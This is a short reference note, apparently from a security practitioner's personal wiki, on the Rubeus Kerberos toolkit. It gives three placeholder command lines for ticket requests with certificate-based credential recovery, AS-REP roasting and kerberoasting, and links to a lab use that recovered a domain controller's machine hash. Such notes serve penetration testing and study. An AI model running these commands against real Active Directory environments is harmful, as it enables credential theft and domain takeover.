---
type: tool
title: Rubeus
category: post-exploit
tags: [ad, windows, kerberos]
updated: 2026-07-09
---

# Rubeus

## What it does
Windows-side Kerberos interaction toolkit: request TGTs/tickets (`asktgt`, `asktgs`), perform AS-REP/kerberoasting, pass-the-key/ticket, and abuse PKINIT (certificate-based) preauth including U2U hash recovery.

## Common usage
```
Rubeus.exe asktgt /user:<acct> /certificate:<b64> /password:"<pw>" /getcredentials /show /nowrap
Rubeus.exe asreproast /user:<user>
Rubeus.exe kerberoast
```

## Used on
- [[absolute]] — `asktgt` with PKINIT turned the `DC$` shadow-credential certificate into a TGT and recovered the machine-account NT hash (see [[kerberos-relay]] → [[dcsync]]).
